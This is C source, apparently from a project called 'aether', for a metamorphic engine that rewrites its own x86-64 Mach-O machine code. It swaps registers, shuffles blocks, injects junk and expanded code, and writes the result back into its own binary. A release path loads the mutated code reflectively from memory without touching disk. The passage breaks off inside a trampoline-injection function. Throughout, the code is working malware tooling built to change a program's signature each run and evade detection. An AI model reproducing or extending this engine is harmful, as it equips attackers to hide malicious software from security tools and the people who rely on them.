#include <aether.h>

static void clear_tx(context_t *ctx);
static bool clear_mut(context_t *ctx);

static bool reg_mut(context_t *ctx, unsigned intensity);
static bool jnk_fill(context_t *ctx, unsigned intensity);

static bool dsk_seg(context_t *ctx, size_t original_size);
static bool dsk_mut(context_t *ctx, const char *binary_path, uint64_t file_start, size_t original_size);

#ifndef FOO
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size);
#endif

static bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,  
                struct mach_header_64 *hdr, uint64_t text_vm_start);
static bool mOrph(context_t *ctx, unsigned generation, size_t max_size);

// Get ASLR slide for this image by asking dyld
intptr_t img_slide(const struct mach_header_64 *hdr) {
    if (!hdr) return 0;

    uint32_t img_count = _dyld_image_count();
    for (uint32_t i = 0; i < img_count; i++) {
        const struct mach_header_64 *h = (const struct mach_header_64 *)_dyld_get_image_header(i);
        if (h == hdr) {
            intptr_t slide = _dyld_get_image_vmaddr_slide(i);
            return slide;
        }
    }
    return 0;
}

// Translate VM address to file offset (walks segments, accounts for ASLR)
uint64_t vmoffst(const struct mach_header_64 *hdr, uint64_t addr) {  
    if (!hdr) return NOFFSET__;

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));

    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (seg->vmsize == 0) { lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize); continue; }

            uint64_t seg_start = seg->vmaddr + slide;
            uint64_t seg_end   = seg_start + seg->vmsize;

            if (addr >= seg_start && addr < seg_end) {
                uint64_t offset_into_seg = addr - seg_start;
                if (seg->fileoff > UINT64_MAX - offset_into_seg) return NOFFSET__;
                return seg->fileoff + offset_into_seg;
            }
        }
        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }
    return NOFFSET__;
}

// Find __TEXT,__text section
bool text_sec(const struct mach_header_64 *hdr, text_section_t *out) { 
    if (!hdr || !out) return false;
    memset(out, 0, sizeof(*out));

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));
    
    // Track __TEXT segment bounds for validation
    uint64_t text_segment_fileoff = 0;
    uint64_t text_segment_filesize = 0;
    bool found_text_segment = false;

    for (uint32_t i = 0; i < hdr->ncmds && i < 0xFFFF; i++) {
        if (!lc || lc->cmdsize == 0 || lc->cmdsize > UINT32_MAX / 2) break;

        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            
            if (strncmp(seg->segname, "__TEXT", 16) == 0) {
                text_segment_fileoff = seg->fileoff;
                text_segment_filesize = seg->filesize;
                found_text_segment = true;
            }
            
            struct section_64 *sec = (struct section_64 *)((uint8_t *)seg + sizeof(*seg));

            for (uint32_t j = 0; j < seg->nsects && j < 0xFFFF; j++) {
                if (strncmp(sec[j].sectname, "__text", 16) == 0 &&
                    strncmp(sec[j].segname, "__TEXT", 16) == 0) {

                    // Validate section offset is within segment bounds
                    if (found_text_segment) {
                        if (sec[j].offset < text_segment_fileoff ||
                            sec[j].offset + sec[j].size > text_segment_fileoff + text_segment_filesize) {
                            DBG("__text section offset 0x%llx size 0x%llx outside __TEXT segment bounds\n",
                                sec[j].offset, sec[j].size);
                            return false;
                        }
                    }
                    
                    out->file_start = sec[j].offset;
                    out->file_end   = sec[j].offset + sec[j].size;
                    out->vm_start   = sec[j].addr + slide;
                    out->vm_end     = out->vm_start + sec[j].size;
                    
                    if (out->file_start >= out->file_end || out->vm_start >= out->vm_end) {
                        DBG("Invalid section bounds: file 0x%llx-0x%llx vm 0x%llx-0x%llx\n",
                            out->file_start, out->file_end, out->vm_start, out->vm_end);
                        return false;
                    }
                    
                    return true;
                }
            }
        }

        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }

    return false;
}

// Grow buffer by doubling until it fits needed_size
bool Ampbuff(context_t *ctx, size_t needed_size) { 
    if (!ctx) return false;
    if (needed_size <= ctx->buffcap) return true;
    if (needed_size > SIZE_MAX / 2) return false; 

    size_t new_capacity = ctx->buffcap ? ctx->buffcap : 64;
    while (new_capacity < needed_size) {
        if (new_capacity > SIZE_MAX / 2) {
            new_capacity = SIZE_MAX;
            break;
        }
        new_capacity = new_capacity * 2;
    }

    // Validate final capacity
    if (new_capacity < needed_size) return false;

    uint8_t *tmp = realloc(ctx->working_code, new_capacity);
    if (!tmp) {
        // Don't modify ctx on failure working_code is still valid
        return false;
    }

    ctx->working_code = tmp;
    ctx->buffcap = new_capacity;
    return true;
}

/**
 * Does this look like real code?
 * not too much padding, instructions decode,
 */
bool mach_O(const uint8_t *code, size_t size) {  
    if (!code || size < 16) return false;

    size_t zero_count = 0, ff_count = 0, valid_instructions = 0;
    size_t threshold = size * 9 / 10;
    size_t min_valid = size / 1024 + 1;

    for (size_t offset = 0; offset < size;) {
        uint8_t byte = code[offset];
        if (byte == 0x00) zero_count++;
        else if (byte == 0xFF) ff_count++;

        if (zero_count > threshold || ff_count > threshold) return false;

        size_t len = snap_len(code + offset, size - offset);
        if (!len || offset + len > size) {
            offset++;
            continue;
        }
        if (len > 0 && len <= 15 && is_op_ok(code + offset)) {
            valid_instructions++;
            offset += len;
        } else {
            offset++;
        }

        if (valid_instructions >= min_valid && offset > size / 2) return true;
    }

    return valid_instructions >= min_valid;
}

/**
 * Mark regions we shouldn't mutate
 * 
 * Protects critical functions (decoder, malloc ... plus first/last
 * quarters of code. avoid suicide.
 */
void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start, 
             uint64_t *ranges, size_t *num_ranges, size_t codesz) 
{
    if (!hdr || !ranges || !num_ranges || codesz == 0) return;

    *num_ranges = 0;

    static void *hooks[] = {
        (void*)mutator,          
        (void*)init_mut,
        (void*)boot_live,
        (void*)decode_map,
        (void*)is_chunk_ok,
        (void*)is_op_ok,
        (void*)chacha20_block,
        (void*)chacha20_random,
        (void*)chacha20_init,
        (void*)text_sec,          //  Used by mutator
        (void*)img_slide,         //  ..
        (void*)vmoffst,           //  ..
        (void*)tx_Init,           //  ..
        (void*)mOrph,             //  Core
        (void*)inject_tramps,     //  Rewriting
        (void*)sketch_flow,       //  CFG 
        // ...
    };

    size_t num_hooks = sizeof(hooks) / sizeof(hooks[0]) - 1;

    size_t third = codesz / 3;
    ranges[0] = 0;
    ranges[1] = third;
    ranges[2] = codesz - third;
    ranges[3] = codesz;
    *num_ranges = 2;

    for (size_t i = 0; i < num_hooks && *num_ranges < (_CAPZ / 2); i++) {
        if (!hooks[i]) continue;

        uint64_t addr = (uint64_t)hooks[i];
        uint64_t off  = vmoffst(hdr, addr);

        // Skip if not in our text section
        if (off == NOFFSET__ || off >= codesz) continue;

        bool covered = false;
        for (size_t j = 0; j < *num_ranges; j++) {
            uint64_t start = ranges[j*2];
            uint64_t end   = ranges[j*2+1];
            if (off >= start && off < end) { covered = true; break; }
        }
        if (covered) continue;

        size_t window = MIN(1024, codesz / 10);
        uint64_t protect_start = off > window ? off - window : 0;
        uint64_t protect_end   = MIN(off + window, codesz);

        if (protect_start >= protect_end) continue;

        ranges[*num_ranges*2]     = protect_start;
        ranges[*num_ranges*2 + 1] = protect_end;
        (*num_ranges)++;
    }
}

// Is this offset in a protected region?
bool chk_prot(uint64_t offset, uint64_t *ranges, size_t num_ranges) { 
    if (!ranges || num_ranges == 0) return false;
    num_ranges = MIN(num_ranges, _CAPZ);
    for (size_t i = 0; i < num_ranges; i++) {
        uint64_t start = ranges[i*2];
        uint64_t end   = ranges[i*2+1];
        if (start >= end) continue; 
        if (offset >= start && offset < end) return true;
    }
    return false;
}

/**
 * Allocates buffers, seeds PRNG with system entropy, builds CFG,
 * marks protected regions, detects code caves. Everything needed
 * before we start mutating.
 */
bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,  
                struct mach_header_64 *hdr, uint64_t text_vm_start) {
    if (!ctx || !code || size == 0 || !hdr) return false;

    memset(ctx, 0, sizeof(*ctx));
    memset(&ctx->muttation, 0, sizeof(ctx->muttation));
    memset(&ctx->cfg, 0, sizeof(ctx->cfg));

    ctx->original_size = size;
    ctx->max_allowed_growth = size * 3;
    ctx->current_growth = 0;
    ctx->codesz = size;
    ctx->hdr = hdr;
    ctx->text_vm_start = text_vm_start;

    uint8_t *og = malloc(size);
    if (!og) return false;

    size_t initial_cap;
    if (size == 0) {
        initial_cap = 64;
    } else if (size > SIZE_MAX / 4) {
        initial_cap = SIZE_MAX;
    } else {
        initial_cap = size * 4;  
        if (initial_cap < 64) initial_cap = 64;
    }

    uint8_t *work = malloc(initial_cap);
    if (!work) {
        free(og);
        return false;
    }

    memcpy(og, code, size);
    memcpy(work, code, size);

    ctx->ogicode = og;
    ctx->working_code = work;
    ctx->buffcap = initial_cap;

    crit_tap(hdr, text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz);

    uint8_t seed[32];
    memset(seed, 0, sizeof(seed));
    
    uint64_t t = mach_absolute_time();
    pid_t pid = getpid();
    uuid_t uid;
    uuid_generate(uid);

    size_t offset = 0;
    if (offset + sizeof(t) <= sizeof(seed)) {
        memcpy(seed + offset, &t, sizeof(t));
        offset += sizeof(t);
    }
    if (offset + sizeof(pid) <= sizeof(seed)) {
        memcpy(seed + offset, &pid, sizeof(pid));
        offset += sizeof(pid);
    }
    if (offset + sizeof(uid) <= sizeof(seed)) {
        memcpy(seed + offset, uid, MIN(sizeof(uid), sizeof(seed) - offset));
    }
    
    chacha20_init(&ctx->rng, seed, sizeof(seed));

    if (!init_mut(&ctx->muttation)) {
        clear_tx(ctx); 
        return false;
    }
    if (!ctx->muttation.entries) {
        clear_tx(ctx);
        return false;
    }

    if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
        clear_tx(ctx);
        return false;
    }
    if (!ctx->cfg.blocks || ctx->cfg.cap_blocks == 0) {
        clear_tx(ctx);
        return false;
    }

    for (size_t i = 0; i < ctx->cfg.num_blocks; i++) {
        if (ctx->cfg.blocks[i].start >= ctx->codesz) {
            clear_tx(ctx);
            return false;
        }
    }

    DBG("tx_Init: size=%zu, blocks=%zu\n", ctx->codesz, ctx->cfg.num_blocks);
    
    return true;
}

static void clear_tx(context_t *ctx) {
    if (!ctx) return;
    
    free(ctx->ogicode);
    free(ctx->working_code);
    
    if (ctx->cfg.blocks) {
        free(ctx->cfg.blocks);
    }
    
    freeme(&ctx->muttation);
    memset(ctx, 0, sizeof(*ctx));
}

/**
 * Decodes everything and checks valid/invalid ratio, padding ...
 * Simple integrity check after mutations.
 */
static bool clear_mut(context_t *ctx) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t instr_capacity = 8192;
    instr_info_t *instrs = malloc(instr_capacity * sizeof(instr_info_t));
    if (!instrs) return false;

    size_t ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);

    if (ninstr == instr_capacity) {
        free(instrs);
        instr_capacity = _ZMAX;
        instrs = malloc(instr_capacity * sizeof(instr_info_t));
        if (!instrs) return false;
        ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);
    }

    if (ninstr == 0) {
        free(instrs);
        return false;
    }

    size_t total_decoded = 0;
    size_t invalid_count = 0;

    for (size_t i = 0; i < ninstr; i++) {
        if (!instrs[i].valid) invalid_count++;
        else total_decoded += instrs[i].len;
    }

    free(instrs);

    size_t max_invalid = MAX(ninstr / 100, 1);
    size_t max_padding = (ctx->codesz > 50000) ? 1024 : 16;

    if (invalid_count > max_invalid) return false;
    if (total_decoded > ctx->codesz) return false;
    if ((ctx->codesz - total_decoded) > max_padding && ctx->codesz < 50000) return false;

    return true;
}

// Register swapping + block shuffling
static bool reg_mut(context_t *ctx, unsigned intensity) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0 || ctx->is_shellcode) return true;

    liveness_state_t liveness;
    boot_live(&liveness);

    size_t start = ctx->codesz * _BEG;
    size_t end   = ctx->codesz * _FIN;
    size_t changes = 0;
    size_t swaps_done = 0;
    size_t max_changes = _CAP(ctx->codesz);
    size_t max_swaps   = MIN(ctx->cfg.num_blocks / 2, 8);
    bool block_changed = false;

    size_t offset = 0;
    size_t attempts = 0;
    size_t max_attempts = max_changes * 10;

    while (offset < ctx->codesz && changes < max_changes && attempts < max_attempts) {
        attempts++;

        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            offset++;
            continue;
        }

        if (offset + inst.len > ctx->codesz) break;
        pulse_live(&liveness, offset, &inst);

        if (inst.has_modrm && inst.len >= 2 && inst.len <= 8 &&
            offset >= start && offset < end &&
            !chk_prot(offset, ctx->ranges, ctx->numcheck) &&
            !inst.is_control_flow && !inst.modifies_ip &&
            (chacha20_random(&ctx->rng) % 100) < (intensity * 20)) { 

            uint8_t reg = (inst.modrm >> 3) & 7;
            uint8_t rm  = inst.modrm & 7;

            if ((reg >= 4 && reg <= 5) || (rm >= 4 && rm <= 5)) {
                offset += inst.len;
                continue;
            }

            uint8_t new_reg = jack_reg(&liveness, reg, offset, &ctx->rng);
            if (new_reg != reg && new_reg != 4 && new_reg != 5) {
                uint8_t new_modrm = (inst.modrm & 0xC7) | (new_reg << 3);
                size_t modrm_offset = offset + inst.opcode_len;

                if (modrm_offset < ctx->codesz) {
                    uint8_t backup = ctx->working_code[modrm_offset];
                    ctx->working_code[modrm_offset] = new_modrm;

                    x86_inst_t test_inst;
                    if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) &&
                          test_inst.valid && !test_inst.ring0 && is_op_ok(ctx->working_code + offset))) {
                        ctx->working_code[modrm_offset] = backup;
                    } else {
                        changes++;
                    }
                }
            }
        }

        offset += inst.len;
    }

    if (ctx->cfg.num_blocks >= 2) {
        for (size_t i = 0; i + 1 < ctx->cfg.num_blocks && swaps_done < max_swaps; i++) {
            if ((chacha20_random(&ctx->rng) % 100) >= intensity * 15) continue;
            
            size_t start_a = ctx->cfg.blocks[i].start;
            size_t start_b = ctx->cfg.blocks[i + 1].start;

            if (start_a >= ctx->codesz || start_b >= ctx->codesz) continue;
            if (start_b <= start_a) continue;  

            size_t end_a = start_b;  
            size_t end_b = (i + 2 < ctx->cfg.num_blocks) ? 
                           ctx->cfg.blocks[i + 2].start : ctx->codesz;
            
            size_t len_a = end_a - start_a;
            size_t len_b = end_b - start_b;

            if (len_a == 0 || len_b == 0) continue;
            if (start_a + len_a > ctx->codesz || start_b + len_b > ctx->codesz) continue;

            if (chk_prot(start_a, ctx->ranges, ctx->numcheck) || 
                chk_prot(start_b, ctx->ranges, ctx->numcheck)) continue;

            if (len_a > ctx->buffcap || len_b > ctx->buffcap) continue;
            if (len_a > len_b * 2 || len_b > len_a * 2) continue;

            size_t max_len = MAX(len_a, len_b);
            uint8_t *tmp_buf = malloc(max_len);
            if (!tmp_buf) continue;

            memcpy(tmp_buf, ctx->working_code + start_a, len_a);
            memmove(ctx->working_code + start_a, ctx->working_code + start_b, len_b);
            memcpy(ctx->working_code + start_a + len_b, tmp_buf, len_a);
            
            free(tmp_buf);

            ctx->cfg.blocks[i].start = start_a;
            ctx->cfg.blocks[i + 1].start = start_a + len_b;

            swaps_done++;
            block_changed = true;
        }
    }

    return (changes > 0) || block_changed || intensity == 0;
}

// In-place mutations (same size)
static bool jnk_fill(context_t *ctx, unsigned intensity) {
    if (!ctx || ctx->codesz == 0) return false;

    int changes = 0;
    size_t offset = 0;

    size_t start = (ctx->codesz * 3) / 10;
    size_t end   = (ctx->codesz * 7) / 10;

    while (offset < ctx->codesz) {
        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) || !inst.valid) {
            offset++;continue;}

        if (offset < start || offset >= end) { offset += inst.len; continue; }
        if (chk_prot(offset, ctx->ranges, ctx->numcheck) || inst.is_control_flow) {
            offset += inst.len;continue;}

        // Increased mutation probability
        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 10)) {  // Changed from % 30 and * 5
            offset += inst.len; continue;}

        uint8_t backup[16];
        memcpy(backup, ctx->working_code + offset, inst.len);

        bool mutated = false;

        if (inst.len == 2 && inst.raw[0] == 0x89) {
            // MOV reg, reg 
            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
                ctx->working_code[offset]     = 0x89;
                ctx->working_code[offset + 1] = 0xC0 | (r1 << 3) | r2;
                mutated = true;
            }
        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x89) {
            // REX.W MOV reg, reg
            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
                ctx->working_code[offset]     = 0x48;
                ctx->working_code[offset + 1] = 0x89;
                ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
                mutated = true;
            }
        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x31) {
            // REX.W XOR reg, reg 
            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
                ctx->working_code[offset]     = 0x48;
                ctx->working_code[offset + 1] = 0x31;
                ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
                mutated = true;
            }
        }

        if (mutated) {
            x86_inst_t test_inst;
            if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) && test_inst.valid)) {
                memcpy(ctx->working_code + offset, backup, inst.len);
            } else {
                changes++;
            }
        }
        offset += inst.len > 0 ? inst.len : 1;
    }

    return changes > 0;
}

/** 
 * Runs expansion > mutations > register swaps > junk injection.
 * Keeps backup, validates after each phase, rolls back if needed.
 * Generation number controls intensity.
 */
bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {    
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t disk_limit = max_size;
    size_t memory_limit = ctx->buffcap;
    bool memory_only = (ctx->codesz >= disk_limit);
    
#ifdef FOO
    // Limit to 2* original size to keep it cool
    size_t expansion_limit = max_size * 2;
    size_t growth_budget = (expansion_limit > ctx->codesz) ? (expansion_limit - ctx->codesz) : 0;
#else
    // Allow expansions for in-memory mutation
    size_t expansion_limit = memory_only ? memory_limit : disk_limit;
    size_t growth_budget = (expansion_limit > ctx->codesz) ? (expansion_limit - ctx->codesz) : 0;
#endif
    
    if (growth_budget <= 0) {
        return reg_mut(ctx, generation) || jnk_fill(ctx, generation);
    }

    size_t needed_capacity = ctx->codesz + growth_budget;
    if (!Ampbuff(ctx, needed_capacity)) return false;

    uint8_t *backup_code = malloc(ctx->buffcap);
    if (!backup_code) return false;
    memcpy(backup_code, ctx->working_code, ctx->codesz);
    size_t backup_sz = ctx->codesz;

    unsigned intensity = (generation == 1) ? 2 : (generation + 1);
    if (intensity > 5) intensity = 8;

    bool success = true;
    size_t size_before_expansion = ctx->codesz;

    liveness_state_t liveness;
    boot_live(&liveness);
    size_t max_expand_size = expansion_limit;
    
    // Expansion enabled in both modes 
    if (generation >= 5 && ctx->codesz < max_expand_size && growth_budget > 0) {
        unsigned depth = 1 + (generation / 10);
        if (depth > 3) depth = 3;
        
        size_t new_size = expand_with_chains(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, depth, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
        }
    }
    
    if (ctx->codesz < max_expand_size && growth_budget > 0) {
        size_t new_size = expand_code_section(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
        }
    }
    
    if (ctx->codesz != size_before_expansion) {
        if (ctx->cfg.blocks) {
            free(ctx->cfg.blocks);
            ctx->cfg.blocks = NULL;
        }
        
        if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
            goto rollback;
        }
        
        crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz);
    }

    if (generation >= 3) {
        engine_context_t engine_ctx;
        init_engine(&engine_ctx);
        mutate(ctx->working_code, ctx->codesz, &ctx->rng, generation, &engine_ctx);
    }

    // Don't fail if no changes
    bool reg_success = reg_mut(ctx, intensity);
    bool jnk_success = jnk_fill(ctx, intensity);
    
    if (!reg_success && !jnk_success) {
        // Try again 
        reg_success = reg_mut(ctx, intensity + 2);
        jnk_success = jnk_fill(ctx, intensity + 2);
        if (!reg_success && !jnk_success) {
            goto rollback;
        }
    }

    size_t remaining_budget = (ctx->codesz < max_size) ? (max_size - ctx->codesz) : 0;
    if (remaining_budget > 0) {
        success = jnk_fill(ctx, intensity / 2);
        if (!success) {
            goto rollback;
        }
    }

    if (!clear_mut(ctx)) goto rollback;
    if (!mach_O(ctx->working_code, ctx->codesz)) goto rollback;
    
    size_t decode_errors = 0;
    size_t offset = 0;
    while (offset < ctx->codesz) {
        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            decode_errors++;
            offset++;
            continue;
        }
        offset += inst.len;
    }
    
    size_t max_errors = ctx->codesz / 100;
    if (decode_errors > max_errors) goto rollback;

    DBG("mOrph: gen=%u, %zu->%zu (+%.1f%%)\n", generation, backup_sz, ctx->codesz,
        100.0 * (ctx->codesz - backup_sz) / backup_sz);

    free(backup_code);
    return true;

rollback:
    // Validate backup size before copying
    if (backup_sz <= ctx->buffcap) {
        memcpy(ctx->working_code, backup_code, backup_sz);
        ctx->codesz = backup_sz;
        ctx->current_growth = (backup_sz > ctx->original_size) ? (backup_sz - ctx->original_size) : 0;
    } else {
        DBG("Rollback failed: backup_sz=%zu > buffcap=%zu\n", backup_sz, ctx->buffcap);
    }
    free(backup_code);
    return false;
}

// Final validation before disk write
static bool dsk_seg(context_t *ctx, size_t original_size) {     
    if (!clear_mut(ctx)) return false;
    if (ctx->codesz > original_size * 4) return false;
    
    instr_info_t *cf_instrs = malloc(8192 * sizeof(instr_info_t));
    if (!cf_instrs) return false;
    size_t cf_ninstr = decode_map(ctx->working_code, ctx->codesz, cf_instrs, 8192);
    if (cf_ninstr == 0) {
        free(cf_instrs);
        return false;
    }
    
    free(cf_instrs);
    if (!is_chunk_ok(ctx->working_code, ctx->codesz)) return false;

    size_t invalid_ops = 0;
    for (size_t offset = 0; offset < ctx->codesz; ) {
        if (!is_op_ok(ctx->working_code + offset)) {
            invalid_ops++;
        }
        
        size_t len = 1;
        x86_inst_t inst;
        if (decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) && inst.valid) {
            len = inst.len;
        }

        offset += len;
        if (offset >= ctx->codesz) break;
    }
    
    // Allow some invalid ops
    size_t max_invalid = MAX(ctx->codesz / 100, 10);
    if (invalid_ops > max_invalid) {
        DBG("Too many invalid ops: %zu (max: %zu)\n", invalid_ops, max_invalid);
        return false;
    }
    
    return true;
}

/** 
 * Disk mutation using injection
 * Write to temp file + atomic rename to prevent corruption
 */
static bool dsk_mut(context_t *ctx, const char *binary_path,  
                               uint64_t file_start, size_t original_size) {
    
    if (!dsk_seg(ctx, original_size)) {
        DBG("Validation failed in dsk_seg\n");
        return false;
    }
    
    // Validate size relationship
    if (ctx->codesz > original_size * 2) {
        DBG("Code grew too much: %zu -> %zu (%.1f%%)\n", 
            original_size, ctx->codesz,
            100.0 * (ctx->codesz - original_size) / original_size);
        return false;
    }
    
    if (ctx->codesz > original_size) {
        DBG("Code has grown: %zu -> %zu bytes (%.1f%% increase)\n",
            original_size, ctx->codesz,
            100.0 * (ctx->codesz - original_size) / original_size);
        
        bool success = inject_tramps(binary_path, ctx,
                                     ctx->working_code,
                                     ctx->codesz);
        
        if (!success) {
            DBG("[!] Injection failed\n");
        }
        
        return success;
    }
    
    if (ctx->codesz > original_size) {
        DBG("Size ctx->codesz=%zu > original_size=%zu\n",
            ctx->codesz, original_size);
        return false;
    }
    
    DBG("In-place mutation: %zu bytes\n", ctx->codesz);
    
    size_t write_size = ctx->codesz;
    
    char temp_path[PATH_MAX];
    snprintf(temp_path, sizeof(temp_path), "%s.tmp.%d", binary_path, getpid());
    int src_fd = open(binary_path, O_RDONLY);
    
    struct stat st;
    if (fstat(src_fd, &st) < 0) {
        close(src_fd);
        return false;
    }
    
    size_t binary_size = st.st_size;
    uint8_t *binary_data = malloc(binary_size);
    if (!binary_data) {
        close(src_fd);
        return false;
    }
    
    if (read(src_fd, binary_data, binary_size) != (ssize_t)binary_size) {
        free(binary_data);
        close(src_fd);
        return false;
    }
    close(src_fd);
    
    memcpy(binary_data + file_start, ctx->working_code, write_size);
    
    // Pad with NOPs if needed
    if (write_size < original_size) {
        size_t pad_size = original_size - write_size;
#if defined(__aarch64__) || defined(_M_ARM64)
        for (size_t i = 0; i < pad_size; i += 4) {
            uint32_t nop = 0xD503201F;
            memcpy(binary_data + file_start + write_size + i, &nop, 4);
        }
#else
        memset(binary_data + file_start + write_size, 0x90, pad_size);
#endif
    }
    
    // Write to temp file
    int temp_fd = open(temp_path, O_WRONLY | O_CREAT | O_EXCL, st.st_mode);
    if (temp_fd < 0) {
        free(binary_data);
        return false;
    }
    
    ssize_t written = write(temp_fd, binary_data, binary_size);
    if (written != (ssize_t)binary_size) {
        DBG("Failed to write temp file: wrote %zd of %zu bytes\n", written, binary_size);
        close(temp_fd);
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    
    if (fsync(temp_fd) != 0) {
        close(temp_fd);
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    close(temp_fd);
    
    int verify_fd = open(temp_path, O_RDONLY);
    if (verify_fd < 0) {
        DBG("Failed to open: %s\n", strerror(errno));
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    
    uint8_t *readback = malloc(write_size);
    if (!readback) {
        close(verify_fd);
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    
    bool verify_ok = false;
    if (lseek(verify_fd, (off_t)file_start, SEEK_SET) == (off_t)file_start) {
        ssize_t read_bytes = read(verify_fd, readback, write_size);
        if (read_bytes == (ssize_t)write_size && 
            memcmp(readback, ctx->working_code, write_size) == 0) {
            verify_ok = true;
        } else {
            DBG("read %zd bytes, expected %zu\n", 
                read_bytes, write_size);
        }
    } else {
        DBG("Failed to seek to file_start: %s\n", strerror(errno));
    }
    
    free(readback);
    close(verify_fd);
    
    if (!verify_ok) {
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    
    // Atomic rename
    if (rename(temp_path, binary_path) != 0) {
        DBG("Failed to rename temp file: %s\n", strerror(errno));
        unlink(temp_path);
        free(binary_data);
        return false;
    }
    
    free(binary_data);
    DBG("[+] In-place mutation passed\n");
    return true;
}

#ifndef FOO
/**
 * Apply mutations via reflective loading
 * This is the RELEASE mode path that uses reflective loading to execute
 * mutated code from memory without touching disk.
 */
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
    if (!ctx || !ctx->working_code || ctx->codesz == 0) {
        return false;
    }
    
    (void)text_base;  // Unused in reflective mode
    
    printf("  Original size: %zu bytes\n", text_size);
    printf("  Mutated size:  %zu bytes\n", ctx->codesz);
    printf("  Growth:        %.1f%%\n", 100.0 * (ctx->codesz - text_size) / text_size);
    
    // Count actual mutations for verification
    size_t mutations_count = 0;
    size_t compare_size = MIN(ctx->codesz, text_size);
    for (size_t i = 0; i < compare_size; i++) {
        if (ctx->working_code[i] != ctx->ogicode[i]) {
            mutations_count++;
        }
    }
    
    printf("Mutations %zu bytes changed\n", mutations_count);
    
    if (mutations_count == 0) {
        return false;
    }
    

    if (!mach_O(ctx->working_code, ctx->codesz)) {
        printf("Mutated code failed validation\n");
        return false;
    }
    
    // Wrap mutated code
    size_t macho_size = 0;
    uint8_t *macho_binary = wrap_macho(ctx->working_code, ctx->codesz, &macho_size);
    
    if (!macho_binary) {printf("Failed to wrap\n");return false;}
    
    printf("Wrapped in structure (%zu bytes)\n", macho_size);
    
    // Verify the binary is valid
    if (!V_machO(macho_binary, macho_size)) {
        printf("V failed\n");
        free(macho_binary);
        return false;
    }
    
    printf("Mach-O V Passed\n");
    
    // Load and execute reflectively
    bool success = exec_mem(macho_binary, macho_size);
    
    if (success) {
        printf("[+] Reflective loading successful\n");
        printf("[+] Mutated code executing from memory\n");
    } else {
        // Go Sideways
        panic();
    }
    
    // The loader has its own copy in RWX memory
    free(macho_binary);
    
    return success;
}

#endif  // !FOO
bool inject_tramps(const char *binary_path,
                   context_t *ctx,
                   uint8_t *mutated_code,
                   size_t mutated_size) {

    if (!binary_path || !ctx || !mutated_code || mutated_size == 0) {
        return false;
    }

    size_t original_size = ctx->original_size;
    if (mutated_size > original_size * 5) {
        DBG("Code grew too much (%zu -> %zu)\n", original_size, mutated_size);
        return false;
    }

    DBG("Original: %zu bytes\n", original_size);
    DBG("Mutated:  %zu bytes\n", mutated_size);
    DBG("Growth:   %zu bytes (%.1f%%)\n",
        mutated_size - original_size,
        100.0 * (mutated_size - original_size) / original_size);

    // Read binary
    int fd = open(binary_path, O_RDONLY);
    if (fd < 0) return false;

    struct stat st;
